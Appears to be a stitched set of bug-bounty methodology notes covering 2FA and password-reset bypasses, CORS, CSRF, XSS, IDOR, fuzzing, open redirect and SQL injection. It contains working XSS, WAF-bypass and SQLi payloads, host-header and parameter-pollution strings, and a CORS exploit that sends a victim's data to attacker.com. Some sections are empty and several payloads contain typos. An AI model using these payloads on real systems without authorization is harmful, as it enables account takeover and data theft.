- [ ]  Lack of rate limit re-sending the code via SMS
- [ ]  Previous sessions ended
- [ ]  Change the password, use the reset password.
- [ ]  copy paste cookie

## How to Test them:

- Resoponse Manipulation
    - Enter correct OTP, get the response of correct otp paste it when you entered the invalid respons
- 2FA code leakage in response
    - Request for 2FA and incept the request, Analyze the reponse and see if the code is leaked or not
- 2FA re-usability
    - Request a 2FA code and Use it, Now try to used it again, if it works consider it as a bug
    - Use the code, after a day or more
- Lack of brute force
    - Capture the request and send it to intruder, run the brute force attack
    
- Direct Request/Forceful browsing
    - Request Straight to the page which reaches after 2FA or any other authentication page
    - If there is no success, change the refer header to the 2FA page URL. This may fool application to pretend as if the request came after satisfying 2FA Condition
- CSRF & ClickJacking on 2FA disable Feature
    - Create 2 accounts, enable 2FA for one of them, capture the disable request run that on second request.
- Bypassing 2FA by sending blank code
    - Capture the asking OTP code request, remove the code or give it a null value and forward the request
- Lack of rate limit re-sending the code via SMS
    - You won't be able to bypass the 2FA but you will be able to waste the company's money.
- Previous sessions ended
    - When the 2FA is enabled, previous sessions created should be ended. This is because when a client has his account compromised he could want to protect it by activating the 2FA, but if the previous sessions aren't ended, this won't protect him.
- Change the password, use the reset password.
    - enable the 2FA, go to reset pass and request the reset pass and login you may bypass.
- copy paste cookie
    - authenticate yourself, if the 2FA is still poped up and you got cookie/token, copy the 2FA enabled account and paste it to another user.


### File: BugHunterMethodology/Checklist/Check List/Race Condition.md

# Race Condition

What is Race Condition? A race condition **occurs** when two or more threads access a shared variable at the same time

## Methodology:

Identify state changing requests which has a limitation, such as…

### **Scenarios:**

1. Uploading files (limited due to trial)
2. Adding member to a group (limited due to trial)
3. Discount coupon usage (usually one time)
4. Like a post (you can like once)
5. Following a user


### File: BugHunterMethodology/Checklist/Check List/Rate limiting Bypass.md

# Rate limiting Bypass

If you are rate limited during another testing use bellow:

- Tamper user agent to mobile user agent
- Tamper user agent to Anonymous user agent
- Use null byte
    - add X-Forwarded: 127.0.0.1


### File: BugHunterMethodology/Checklist/Check List/Reset Forget Password.md

# Reset/Forget Password

There are some test should be done:

- [ ]  Is it one time use?
- [ ]  Use Your Token on Victims Email
- [ ]  HTML injection in Email
- [ ]  Manipulate Email parameter
- [ ]  When 2-10 links are requested, the prior link expires?
- [ ]  Is it bind in an account or the link works when the Email has been changed?
- [ ]  Can you Enumerate All Email?
- [ ]  Can you send so many reset email to a specific in order to spam their email
- [ ]  Can you inject an arbitrary header to the request? (Host header poising)
- [ ]  Can you add `Referrer` to the request
- [ ]  Response manipulation
- [ ]  Long password (200+) leads to DoS
- [ ]  Use `User@burp_collab.net`
- **How to test them**
    - Not one Time (search for leaked tokens `gau`, `scan.io`, `waybackurl`)
        - change the password through link and log out again try to change password again
    - Use Your Token on Victims Email
        
        ```
        ```
        POST /reset
        ...
        ...
        email=victim@gmail.com&token=$YOUR-TOKEN$
        
        ```
        ```
        
    - HTML injection in Email
        - HTML injection in email via parameters, cookie, etc > inject image > leak the token
    - Use the first link or second to change the Pass and re-use the another link
    - Bind to account
        - Create an account and make a request to reset your password don’t use the link and change your email and now change your pass with the previous reset link
    - Enumeration
        - Enter the email that does not exsit, now enter email that exist! does it reveal users? or have diference?
    - Brute force
        - send the request to Burp and use null passlist
    - Token leakage in the Host header
        1. Enter your email and be sent the link open it
        2. can be seen in the URL bar, do not change your pass
        3. open third party sites like facebook etc. while the intercept is on or capture the request
        4. you can see your token leaked
    - Manipulate the parameters
        
        ```jsx
        
        email=victim@gmail.com&email=attacker@gmail.com
        email=victim@gmail.com%20email=attacker@gmail.com
        email=victim@gmail.com|email=attacker@gmail.com
        email="victim@gmail.com%0a%0dcc:email=attacker@gmail.com
        email="victim@gmail.com%0a%0dbcc:email=attacker@gmail.com
        email="victim@gmail.com",email="attacker@gmail.com
        {"email": ["victim@gmail.com","attacker@gmail.com"]}
        
        ```
        
    - Host header poising
        1. Open the link through Burp and intercept it, add Host header like bellow
        
        ```bash
        #0-- Host: attacker.com
        #1-- Host:target.com
        #1-- Host:attacker.com
        #2-- Host: attacker.com/target.com
        	#3-- X-Forwarded-Host: attacker.com --> add this bellow host headet
        #4-- X-Host: attacker.com
        #5 X-Forwarded-Server: aliali.com
        ```
        

Some tests:

1. You should be able to change your password one time, Log out and try the reset link again
2. when there are more than one link, one of it should just work
3. when you request to reset your password with an account e.g. `ali@ali.com` and keep the link unopen, then you change the email and try to reset your pass by the prior link
4. when the email does not exists, it does not have to reveal someone else account
5. send the request to the intruder and make the request till 50 times to bomb email box
6. when it allows you to inject Host header to a packet it can be loged in that server
7. Referrer means to third party may have you token


### File: BugHunterMethodology/Checklist/Check List/Web Cache Deception.md

# Web Cache Deception

Web Cache Deception arises when the cache server (which can either be a load balancer, revers proxy, and CDN) caches sensitive and private files

- If there is a web page that returns sensitive information (CSRF-TOKEN) try to test WCD

### Conditions:

1. Cache proxy should be configured to cache files based on the extension of the file (.css) and not on the content-type.
2. So, the response should have text/html `content-type`
3. Sensitive data should be cached, not being dynamic! Means the header must be `HIT`
4. It should not show 404 not found instead it must load the data
5. The response should not have `Cache-Control`, `no-cache`, `max-age`, `private` and `no-store`

### How to test:

1. Find an endpoint revealing sensitive info, find out that the web app uses any cache mechanism 
2. append or try “Test cases" , open the URL in a incognito tab or `CURL` command
- **Test Cases:**
    - [ ]  example.com/profile.php/nothing.css
    - [ ]  example.com/profile.php.css
    - [ ]  example.com/profile.php/../nothing.css
    - [ ]  example.com/profile.php/%2e%2e/test.js
    - [ ]  Use lesser known extensions such as .`avif` (Search on google, cloudflare has a good list)


### File: BugHunterMethodology/Checklist/Check List/WebApp works with COOKIES.md

# WebApp works with COOKIES?

Try CSRF or CORS:

## CORS:

- always add `Origin: domain.tld` in every page

## CSRF:

- If cookie is SameSite, an XSS is needed on any subdomains
- if the cookie is LAX, still possible. However, the state-changing request should be done by GET method.
- if app works with cookie and JSON format more likely to be vulnerable
    - make the request simple (cuz if it is JSON a preflight is sent and not be allowed)

Here are 3 condition:

1. The Request is state-changing (something changes …)
2. The site works with Cookie (none and lax)
3. The request is SIMPLE
    1. HEAD, POST, GET
    2. URL-encoded, text-plain, multipart
    3. some basic headers


### File: BugHunterMethodology/Checklist/Check List/information disclosure.md

# information disclosure

- js secret finding command

```bash
cat all-js-tosecret | while read url ; do python3 SecretFinder.py -i $url -o cli >> secret.txt; done
```


### File: BugHunterMethodology/Methodology/Methodology Flow/Authentication Class.md

# Authentication Class

The bullets

- Authentication
    - Fuzz to discover hidden parameter, many open redirect and XSS here
    - Response manipulation, it works on legacy web application, sometimes leads to a new page to test
    - Login with an email address, try to register by a same with small change
        - `myemail@email.com` → `my%00email@email.com`
        - `myemail@email.com` → `my.email@email.com`
        - `myemail@email.com` → `my.email+123@email.com`
    - Change the Email address, use the old code to verify
    - Send HTTP request to the registration endpoint while authenticated and fuzz for hidden parameter
- Registration
    - Fuzz to discover hidden parameter, many open redirect and XSS
    - Register with special accounts, such as `noreplay@github.com` or `support@company.com`
- Forget password
- [Reset/Forget Password](https://www.notion.so/Reset-Forget-Password-e7d42ed48bdf4b918ad707b2d4d815b8?pvs=21)
    - Fuzz to discover hidden params
    - Change the `host` header in the forgot password HTTP request
    
    ```
    #0-- Host: attacker.com
    #1-- Host:target.com
    #1-- Host:attacker.com
    #2-- Host: attacker.com/target.com
    #3-- X-Forwarded-Host: attacker.com --> add this bellow host headet
    X-Host: attacker.com
    ```
    
    - Add `referrer` and `origin` too
    - Collect the tokens for further analysis
    - Try parameter pollution, works here
    
    ```jsx
    email=victim@gmail.com&email=attacker@gmail.com
    email=victim@gmail.com%20email=attacker@gmail.com
    email=victim@gmail.com|email=attacker@gmail.com
    email="victim@gmail.com%0a%0dcc:email=attacker@gmail.com
    email="victim@gmail.com%0a%0dbcc:email=attacker@gmail.com
    email="victim@gmail.com",email="attacker@gmail.com
    {"email": ["victim@gmail.com","attacker@gmail.com"]}
    ```
    
    - Check if password reset link is not expired (low)
    - 2 factor authentication
- Response manipulation, e.g. change param value from `false` to `true`
- Login with the credentials, send request to all features without performing 2FA
    - make request to an API which returns user’s information
    - make request to update user’s information


### File: BugHunterMethodology/Methodology/Methodology Flow/CORS Misconfigure.md

# CORS Misconfigure

Let’s cover the methods to discover CORS misconfiguration

## **Methodology**

- Check if site works by the cookies or not
- it doesn't matter if site uses CORS or not
- Set `Origin` header in the request within the same URL
- if `ACAO` and `ACAC` presents try bypass methods

## Flaws and Bypasses

- Check origin function flaw, popular vectors (for `[https://domain.tld](https://domain.tld)` and `https://subdomain.domain.tld`)

```
https://**domian.tld**.attacker.com 
https://**domian.tld**attacker.com 
https://attacker.com**domain.tld**
https://**subdomian**.attacker**domain.tld**  
https://**subdomain.domain**.attacker.**tld**
https://**subdomain.domain**attacker.**tld 
null
attacker.computer**
```

Some bypasses:

```
https://website.com%60.attacker.com
https://foo@attacker.tld:80@trip.com
https://foo@evel-host%20@trip.com
```

- To be more precise, use a fuzzer
- if there is no bypass try fuzz different subdomain (`FUZZ.domain.tld` )in `Origin` header
    - Do not brute force blindly
    - Extract all live subdomains of target and make a list
    - Check the list to see what is the white list
    - Try to find XSS in the subdomain to extract data from target domain (can be used for XSS post exploitation)

## Exploitation

if you’ve found a misconfiguration, Do not rush for the report. Try to exploit the issue

- Open an http website
- Open the browser console
- Write your exploit code

```jsx
fecth("https://domian.tld/api/information/me",{
	credentials: "include"
})
.then((response) => {
	document.location = "//attacker.com/log/?key={0}".format(response.text());
});
```

The `null` exploitation:

```jsx
<ifrmae ...>
```

## Useful flow:

# Asset → httpx → CORS Misconfiguration

The automation code is:

```jsx
cat (subdomains/urls) | while read domain; do httx -H "Origin: https://$domain" -sr -silent; done
```

Make a GF filter:

```jsx
{
		"flags": "-HriE",
		"patterns":[
				"Access-Control-Allow-Origin"
	]
}
```

then work manually on them.


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Request Forgery.md

# Cross Site Request Forgery

## Methodology

The methodology is to find **state-changing requests**, then try to bypass the security manually

- Important rule: ALWAYS make an exploit code and run it to show the POC
- Fuzz to find hidden path and parameters, they mostly are not protected against CSRF
- Pay attention to the **SameSite** flag of the cookie (Lax or Strict)
    - If **SameSite** is not None, you need an XSS in any subdomains
    - If **SameSite** is **Lax**, you can still exploit the CSRF with a top level navigation exploit (GET only)
- **JSON request** with **cookies** are more likely vulnerable to CSRF, why?
    - The endpoints might accept other content types
    - JSON requests with token are safe
- Does mobile endpoints work with **Authentication Cookies?**
- CSRF Bypasses
    - Change the content type
    
    ```
    application/json -> application/x-www-form-urlencoded
    ```
    
    - Sometime be creative (do the following requests trigger the pre-flight?)
    
    ```
    application/json -> application/text/plain; application/json
    application/json -> application/x-www-form-urlencoded; application/json
    ```
    
    - Send empty value or remove the CSRF token
    
    ```
    data=value&CSRF_TOKEN=token -> data=value&CSRF_TOKEN=
    data=value&CSRF_TOKEN=token -> data=value
    ```
    
    - Change the token with a valid one (your token)
    
    ```
    data=value&CSRF_TOKEN=token -> data=value&CSRF_TOKEN=your_token
    ```
    
    - Verb tamper the request, works? try previous bypasses
    
    ```
    POST / HTTPS/1.1
    username=user&CSRF_TOKEN=value
    
    GET /?username=user&CSRF_TOKEN=value HTTP/1.1
    ```
    
    - Put the header’s CSRF token in body (not vice versa, why?), works? try previous bypasses


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS).md

# Cross Site Scripting (XSS)

It’s a most common vulnerability which can be found everywhere

[XSS Discovery](Cross%20Site%20Scripting%20(XSS)/XSS%20Discovery.md)

[Dom Based XSS](Cross%20Site%20Scripting%20(XSS)/Dom%20Based%20XSS.md)

[Methodology](Cross%20Site%20Scripting%20(XSS)/Methodology.md)

[WAF Bypass](Cross%20Site%20Scripting%20(XSS)/WAF%20Bypass.md)

[Payloads](Cross%20Site%20Scripting%20(XSS)/Payloads.md)


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Dom Based XSS.md

# Dom Based XSS

There are two important concepts:

- Source
    - Location that the data is taken by the application
    - Examples
        - `document.url`, `document.location.hash` and etc.
        - `document.refere`r,`window.name` and etc.
        - `Ajax`, `Websockets` and `Webmessaging`
        - `Cookies`, `localstorage` and `sessionStorage`
- Sink
    - Location that the data is passed into and get executed
    - Example
        - Javascript execution sinks as: `eval(payload)`, `setTimeout(payload,100)`, `<div onclick=”payload”>`
        - Javascript URI sinks as: `document.loacation = payload`, `location.href = payload`, `window.open=payload`
        - HTML execution sinks as: `htmlElement.innerHTML=payload,` `document.write(payload)`
        - HTML modification to behavior change: `(element).src` or `(element).href` (in certain elements)

More Sinks:

```html
document.write //Works with <script> & Make sure to close the existing elements before running payload.
someDOMElement.innerHTML //Doesnt accept <script> or <svg> & works with <img>,<iframe> + eventhandler(onerror, onload)
window.location //In location sinks use javascript: protocol
window.open //In location sinks use javascript: protocol
someDOMElement.insertAdjacentHTML
someDomElement.onevent
eval
Function
setTimeout
setInterval
setImmediate
execScript
crypto.generateCRMFRequest
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
anyTag.onEventName
anyElement.innerHTML
Range.createContextualFragment
```


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Methodology.md

# Methodology

How to find XSS in a scope?

- important phase? discover hidden parameters
- Search for the reflections, it doesn't matter its stored or not. Work manually on the reflection
- Download JS and HTML files then grep JavaScript keywords
    - Search for the eventListener `addEventListener\((?:’|\”)message(?:’|\”)”`
    - Search for the JavaScript sources or sinks
- Search for the postMessages and try to find misconfiguraion
- Blind XSS → Spray everywhere!!!
- Some tools (Gxss, kxss, dalfox, etc) use them all


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Payloads.md

# Payloads

Some nice payloads:

```html
<img/src/onerror=alert(origin)>
<img/src/onerror=\u0061lert?.(origin)>
<details/open/ontoogle=JS>
<script src=data:,alert(origin)></script>
https://www.akamai.com/?xss=%3cinput/onbeforinput=%27a=alert,a(1)%27%3E
"><ifame srcdoc="">
">%26%2300%3B</form><input+type="s"/onfocus="alert(document.cookie)"/autofocus>
">&#00;</form><input type&#61;"s" onfocus="alert(1)" autofocus>
<img/serset":"/onloaded=alert(1)>
<svg onload=location=name>
<a/href=javascript&colon;alert()>click

```

All in one but noisy

```
JavaScirpt://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\/*%26apos;)*<!--></Title></textArea></iFrame></noScript></style>/autoFocus/Onfocus=/*{/*/;{/**/a=(alert(1)}//<Base/Href=//X55.is\76-->
```

All payloads that bypass WAFs

```bash
 onload=top[/al/.source+/ert/.source]`origin`>hi</a> => alert is filtered!!
```

XSS Without `()`

[XSS-Payloads/Without-Parentheses.md at master · RenwaX23/XSS-Payloads](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/WAF Bypass.md

# WAF Bypass

How to bypass a WAF to achieve XSS?

- if the WAF is well-known, search in the net to get the bypass (twitter too)
- If you inject your payload and it is removed, try to add inside the tag `<scr<script>ipt>`
- if it encodes fuzz the js files
- try to use fromCharCode function when the quote is filter
- if you want to discover a payload, pay attention to following notes
    - WAFs commonly use regex rulesets which detect malicious inputs
    - Fuzz to discover which part of the payload is matched by the WAF’s ruleset
    - WAFs commonly are not updated, the newer HTML tag is, the more chance you have
    
    ```html
    <details/open/ontoggle=JS>
    ```
    
    - if you cannot make alert, try to put the payload after `#`, since part is not sent to the server
    
    ```html
    <details/open/ontoggle="location.hash.split('#')[1]">#javascirpt:alert(`XSS`)
    <x/onclick=a=evel,a('/'+location.hash)>here<x>#/-alert(origin)
    ```
    
    - Expand your payload to confuse the WAF
    
    ```html
    <img src"/" =_=" title="onerror='prompt(1)'">
    <--`<img/src=` onerror=alert(1)> --!>
    ```
    
    - Bypass onxxx
    
    ```bash
    onxxx if filter?
    try to fuzz attributes
    for e.g. srcdoc in iframe, href in a and so on
    
    <iframe srcdoc=<script>prompt``</script></iframe>
    ```
    
    - CSP Bypass
    
    ```bash
    <script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"</script>
    ```


### File: BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/XSS Discovery.md

# XSS Discovery

## Methodology:

1. Use any Entry point and input your special text (aliali)Use this text, and try to search it in the responses of burp
2. make an auto repeater config to send a blind xss as well
3. when you enter your age, number, drop down and it gets reflected, so try to inject payload via burp

### There are a few possible situations that input can be reflected

- Outside tag
    - Executable
    - Non-executable
- Inside tag
    - inside an Even Handler
    - inside `src`Attribute
    - inside `srcdoc`Attribute
    - Generic Attribute
- JavaScript context

Before continue, lets see an useful flow:

Payload —> browser ⇒ changes  —> urlEncode —> server ⇒ url Decode —> browser —> DOM —> XSS

## Before Start

- what is HTML encoding?
    - HTML encoding ensures that text will be correctly displayed in the browser, not interpreted by browser as HTML.
    - `&#xHEX,`example is `&#x61;`
    - `&#DEC`, example is `&#97;`
- what is character reference?
    - Symbolic names for characters that may be included in an HTML document
    - `&lt;` represents the `<` sign
    - `&gt;` represents the `>` sign
    - `&quote`; represents the `“` sign
    - `&colon;` represents the `:` sign
- What is Unicode?
    - It’s a way of encoding multilingual plain text
    - In JavaScript, the general syntax is `\uXXXX` where `X` denotes hexadecimal digits
    - `\u0061` represents the `a` character
- What is URL encode?
    - URL encoding converts characters into a format that can be transmitted over the internet (URL can contain ASCII)
    - The format `%HEX` is using to encode data
    - `%41` represents the A character
    - Sometimes the server and application decode the data respectively, so double URL encode data are valid

AS instance, the following data:

```html
test%20test
test%5ctest
test%26%23test

ali$0anext+line
```

Will be turned into the following data:

```html
test test
test\test
test&#test

ali
next line
```

## Golden Tips

- Browsers **automatically HTML decode** the **HTML attributes**
- Browsers parse the Unicode in **JavaScript**
- Browsers **do not parse** HTML tags if they are **encoded**

Now, let’s begin with how to discover an XSS

## Outside Tag

Two possibilities

### Executable

The HTML tag is going to be parsed and executed. Tree payloads can be used:

```html
<{tag}{filler}{eventhander}{?filler}={?filler}{javascript}}{?filler}{>,//,Space,Tap,LF}
<sCript{filler}sRc{?filler}{url}{?filler}{>,//,tap,LF}
<A{filler}hRef{?filler}={?filler}javascript:javascriptCode{?filler}{>,//,Space,Tap,LF}

#<img src=x onerror=alert()> # each tag
#<script src=url></script>
#<a href=javascript:alert()>
```

Start manual fuzz

```html
<x{SP}xxx=
<x{SP}onxxx=
```

Some separators:

```html
{SPACE}
//
/
%0a
%0d
%09
%09%09
/~/
```

Example:

```html
<img/xxx
<img/~/xxx
<img/~/onxxx
```

Some payloads:

```html
<a hRef="&#x74;avascript:&colon;alert()">test</a>
<IMG/src/onerror=alert(0)>
```

Outside Tag → Executable → <x{SP}onxxx → 3 cases 

1. Failed {Regex: delete or strip out the tag ⇒ noting }
2. Failed {Blacklist: FUZZ}
3. Encoded {Double encoded, HTML encode ⇒ it encodes your payload to html encode, you have encode it by URL or encoded it by html again }

### Non-executable:

The tags {also wont be executed in HTML comment}

```html
<style>
<title>
<noembed>
<template>
<noscript>
<textarea>
<!-- non-executanel -->
```

Start manual fuzz (for closing tags):

```html
</tag>
</tAg/x>
</tag{space}>
</tag//>
</tag%0a>
</tag%0d>
```

## Inside tag

some situation may occur

### Inside an Even Handler

Code example:

```html
<tag event_handler="func('$input')">
```

The exploitation is easy since we can take advantage of **HTML encodings**

```html
');alert(origin);// -> &#39;);alert(origin);// 
```

### inside `src` Attribute

Code example:

```html
<script src="$input">
```

Try to use remote JS, it the host is **whitelisted**, try to **bypass**

### Inside `srcdoc` Attribute

```html
<iframe srcdoc="$input">
```

The exploitation is easy since we can take advantage of **HTML encodings**

```html
&lt;svg/onload=alert()&gt;
```

### Generic Attribute

Code example:

```html
<input type="text" value="$input">
<input type="text" value='$input'>
<input type="text" value=$input>
```

You should break the context, if there is no context, there is no need to break. Some methods:

```html
"
%22
%2522
&quot;
%26quot;
%2526qout;
'
%27
%2527
&#39;
%26%2339;
%2526%252339;
```

If you succeed, try to use **1. Event Handlers** of close the **2. HTML tag.**

### JavaScript Context

Code example:

```html
var test = '$input';
```

Try to **break the context**, or **close the script tag**. Example:

```html
';alert(origin);//
</script/x><img/src/onerror=alert()>
```

Sometimes you do not need to break something, as an instance:

```
location.replace($input)
```

Which can be exploited **without break.** Consider that you cannot use **HTML encoding**, but **tab character**

```
javascript:alert(1)
javascr**%09**ipt:**\u0061**lert(1)
javascr**\t**ipt:\**u0061**lert(1)
```

Test your payload on : [click](http://jsfiddle.net)


### File: BugHunterMethodology/Methodology/Methodology Flow/Fuzzing on various properities.md

# Fuzzing on various properities

**The bullents**

- hidden prammeter
- hidden endpoint
- hidden file discovery

## How to Fuzz

There are various tools:

- FUFF
- KiteRunner
- IIS-Shortname-Scanner

## Fuzzig files and directories

Before fuzz, make sure that you can find an existing file, then fuzz. this method is called **Varify Method**.

```bash
GET /file.ext → 200
ffuf -w list -u "https://site.com/FUZZ" -ac
#use a list maker to generate a short list wlist_maker
```

Important note in fuzzing 

- make your own word list
- Fuzz based on the context, for example

        → Skip file fuzz on web app run by **Express**

        → Skip endpoint fuzzing on rest APIs (except the last part)

- Change the user-Agent header to avoid blocking
- Tune the treads to avoid banning
- Watch out the CDN before fuzzing

## Word list

you should generate your own word lists

Parameters → use that param extractor 

! extract parameters, filename, and words from AllUrls (gospider)

## Fuzzing endpoint

In order to fuzz an endpoint, use

- FFUF to fuzz last part of the endpoint
- KiteRunner to fuzz whole endpoint

```bash
kiterunner commamdns
```

## Fuzzing parameters

To fuzz on parameters, you can add bunch of parameters to speed up the fuzzing

```
GET /param1=value&param2=value2&param3=value3...
```

The following tools can be used to hidden parameters discovery

- Arjun
- x8 (is recommended)
- parameth (not tested)

## Where to fuzz?

Some cases are:

- Fuzz the endpoints which return information
- Fuzz the files without any parameter
- Fuzz all endpoint and files to discover extra parameters
- Root or other directories (files and directory fuzz)

## Methodology

I recommend to use the steps (Do not forget to use Verify Method)

- Crawl the target and save all file names and paths - Gospider and Manual crawling
- Detect the web app technologies, then

     → conduct fuzzing on the full and relative paths to discovery **hidden paths** 

     → conduct fuzzing on the file name and directories to discover **hidden files and directories**

     → generate a fuzz list based on the target’s site map and fuzz - ali.com/ali.com.bak

- Crawl the target and save all parameters - GAP, and gau-sorter
- conduct parameter fuzzing to discover hidden parameters

## Examples

Examples 1: a rest API endpoint

```
/api/user/699201852
```

Fuzz:

```
/api/user/69920852/**FUZZ** //words
/api/user/**FUZZ**/69920852 //words
/api/**FUZZ**/69920852/**FUZZ**
/api/user?**FUZZ**/69920852?**FUZZ**// params
```

Example 2: Single PHP page

```
/change_password.php
```

Fuzz

```
/**FUZZ**.php //file names, words
/change_password.php**FUZZ** // "~", ".1", ".2", ".3", "s"
/change_password.php?**FUZZ**
```

Some old extension

```bash
.7z, .back, .bak, .bck, .bz2, .copy, .gz, .old, .orig, .rar, .sav, .save, .tar, .tar.bz2, .gzip, .tar.gzip, .tgz, .tmp, .zip,
```

Fuzz on domain with old.txt

```bash
ali.com/ali.com.zip (tar|gzip|bz2|tar.zip|tgz|log)
ali.com/www.ali.com.zip
ali.com/ali.zip
```


### File: BugHunterMethodology/Methodology/Methodology Flow/HTTP Request Smuggling.md

# HTTP Request Smuggling

Methodology

- Use HTTP Request smuggling in burp suite to discover vulnerability
- Use Smuggler to discover vulnerability
- Exploit The Flaw manually, Some techniques may be useful (Exploits)
    - Do application recon (Fuzz and etc) to discover a redirection path, try adding host header
    - Find redirection or any section that can save data, leak the information from front server
    - Check if the target uses cache implementation, try cache deception
    - Try to exploit in order to DDoS


### File: BugHunterMethodology/Methodology/Methodology Flow/Insecure direct Object Reference (IDOR).md

# Insecure direct Object Reference (IDOR)

In order to find IDOR, you should use appropriate recon and some techniques.

## Methodology

- [Application Recon] - Fuzz the endpoints which return information
- [Application Recon] - Conduct application and search in JavaScript files for API endpoints and parameters
- Conduct tests on any object which returns information (easy to test, hard to discover)
- Conduct tests on state-changing functionalities, it’s more tricky (easy to test, easy to discover)
- Some tips:
    - In some web application you face **UUID** or something similar, it’s not IDOR unless you can leak others users **UUIDs**
    - There may be endpoints to translate emails or other properties into **UUIDs**, check for those
    - If you face a value which seem to be random, try to generate more values to fine a pattern
    - Leverage **Mass Assignment to discover** IDOR in state-changing functionalities
    - Use parameter pollution to discover IDOR or bypass the forbidden action
    - Decode the values which seem to be base64

## How to test

- Endpoint fuzzing

```html
/endpoints/users/me
/endpoints/**[FUZZ]**/**[FUZZ]**
```

- Add parameters to the endpoints which return the information

```html
GET /api/v1/getuser
[...]

**use:**

GET /api/v1/getuser?**id=1337 -> where you find this? from js files! and you fuzzing wordlist kite runner**
[...]
```

- Use parameters pollution in state-changing requests (even non state-changing)

```html
POST /api/forget_password
[...]
email=victim_email**&email=hacker_email

use:**

POST /api/forget_passwrod
[...]
{"email":"victim_email", **"email":"hacker_email"}**

GET /api/users/user_id=ligimet**&user_id=victim** 

GET /api/users/user_id=victim**&user_id=ligimet**
```

- Use extensions to bypass forbidden actions

```html
GET /v2/GetData/1234 --> 403 forbidden 
[...]

GET /v2/GetData/1234**.json** --> 200 ok
[...]
```

- Test on outdated API version (or even upcoming version)

```html
POST /v2/GetData
[...]
id=1234

**use:**

POST /**v1**/GetData
[...]
id=1234
```

- Manipulate JSON packets

```html
POST /api/get_profile
[]
{"id":"111"}

**use:**

POST /api/get_profile
[]
{"id":"[1111]"}

POST /api/get_profile
[...]
{"user_id":**{"user_id":"111"}}**
```

- Finding UUID
    - Wayback machine
    - Alien vault OTX
    - URL Scan
    - Common Crwal
    - Google Search
    - Github Search
    - Referrer header
    - Js files
- Try to swap uuid with number

```html
GET /file?id=ef0930894-e98dj930-uba938

use:

GET /file**?id=1**
```

- Many endpoints take complicate object IDs, like **UUIDs** or so, try **numeric integer IDs** on all
- Abusing the revers proxy

```html
POST /users/delete/VICTIM_ID --> 403 forbidden

**Use:**

POST /users/delete/**MY_ID/../VICTIM_ID** --> 200 OK
POST /users/delete/**MY_ID/%2f%2e%2e%2eVICTIM_ID** --> 200 OK
```

- use verb tampering to bypass forbidden

```html
POST /users/delete/VICTIM_ID --> 403 forbidden

use:

**DELETE** /users/delete/VICTIM_ID --> 200 ok
```

- Try to discover hidden parameter even-though there is an ID in the request (guess, extract or fuzz parameters)

```html
GET /v2/profile/1000 --> 200 OK
GET /v2/profile/1001 --> 403 forbidden

**use:**

GET /v2/profile/1000?**[FUZZ]=**1001
GET /v2/profile/1000?**user_id=1001** --> 200 ok

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /v2/profile
[...]
name=ali&email=ali@gmail.com

**use:**

POST /v2/profile?**user_id=1001**
[...]
name=ali&email=ali@gmail.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /v2/profile
[...]
user_id=1000

use:

POST /v2/profile?**user_id=1001**
[...]
user_id=1000
```

- Use Special characters

```
api/user/01* 
api/user/*
api/user/%
api/user/_
api/user/.
```

- Checking Referrer

```
GET /user/02 
Referrer: example.com/users/**01**          -> 403 forbidden

GET /user/02 
Referrer: example.com/users/02          -> 200 OK

```


### File: BugHunterMethodology/Methodology/Methodology Flow/LFI Directory Traversal.md

# LFI/Directory Traversal


### File: BugHunterMethodology/Methodology/Methodology Flow/Mass assignment.md

# Mass assignment

Its categorized as a modern vulnerability which occurs when whole object is passed into an updated or create database query. The methodology to find it 

- Look for the data returning URLs, collect all objects and fields
- Identify state changing requests, such as create or update various properties
- Try to add object keys in the state changing requests
- Sometimes, hidden parameter discovery is useful to get an unexpected result

```
POST /v1/merchant/account

{
			"name": "ali",
			"email": "ali@ali.com",
			"**FUZZ**": "test"
}
```

###


### File: BugHunterMethodology/Methodology/Methodology Flow/Open Redirect.md

# Open Redirect

## Methodology

The methodology is simple, look for any parameters or endpoint, try to bypass it manually 

- Simple in common potential endpoints to find redirection, such as **login**, **logout**, **change site lang,** **links in emails**
- Fuzz to discover hidden files and endpoints
- Fuzz the endpoints to **discover** hidden parameters
    - If the endpoint does not have parameter, try fuzz, e.g. `/logout`
    - If the endpoint has parameters, try to **add new parameters** to the query string
- To enhance your hunting, try to collect redirect parameters separately
- If you find a redirection point, try to bypass it manually
- Search on google
    
    ```
    site:domain.tld inurl=%2f
    site:domain.tld inurl=http
    ```
    
    - for bypassing try these:
    
    ```markdown
    open redirect 
    
    1. ali.com/?next=google.com/hi/test --> wipe out from end
    + ?next=google.com@evil.com
    + ?next=google.com.evil.com
    + ?next=google.comevil.com
    + ?next=evil.com&dummy=google.com
    + ?next=domain.tld/@attacker.com/doman.tld
    
    2. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../level1/?next=
    
    3. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    (to bypass this: capitalize letters)
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../Level1/?next=
    
    4. ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/
    (url encode 2x)
    + ali.com/?next=google.com/hi/test --> ali.com/?next=google.com/hi/../%254cevel1/?next=
    
    5. ali.com/?next=google.com&h=09929893828983(hash of google.com)
    + ali.com/?next=evil.com&h=2489339478283(hash of evil.com)
    ```
    
- Payload all the things exists also.


### File: BugHunterMethodology/Methodology/Methodology Flow/SQL Injection.md

# SQL Injection

```sql
' or sleep(5)#--
' or sleep(5)='
;waitfor delay '0:0:5'--
') or sleep(5)=
```


### File: BugHunterMethodology/Methodology/Methodology Flow/Server Site Request Forgery (SSRF).md

